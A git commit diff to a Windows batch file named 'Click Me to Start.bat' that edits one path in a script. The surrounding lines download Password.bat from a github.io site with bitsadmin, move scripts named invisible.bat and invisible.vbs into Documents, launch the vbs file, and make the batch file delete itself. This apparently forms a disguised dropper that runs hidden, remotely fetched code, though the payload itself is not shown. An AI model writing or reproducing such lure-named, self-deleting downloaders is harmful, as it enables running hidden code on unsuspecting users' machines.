652d1c1a9884fa6d8dd60e2db7813d8425ea836a
athdot <athdot@gmail.com>
2017-02-01 13:51:45 -0700

    Update Click Me to Start.bat

--- Click Me to Start.bat
+++ Click Me to Start.bat
@@ -42,6 +42,6 @@ bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/Password.bat %USERPR
 move %USERPROFILE%\Desktop\invisible.bat %USERPROFILE%\Documents\invisible.bat
 move %USERPROFILE%\Desktop\invisible.vbs %USERPROFILE%\Documents\invisible.vbs
 
-start %USERPROFILE%\Documents\MASTERFOLDER\invisible.vbs
+start %USERPROFILE%\Documents\\invisible.vbs
 (goto) 2>nul & del "%~f0"
 exit
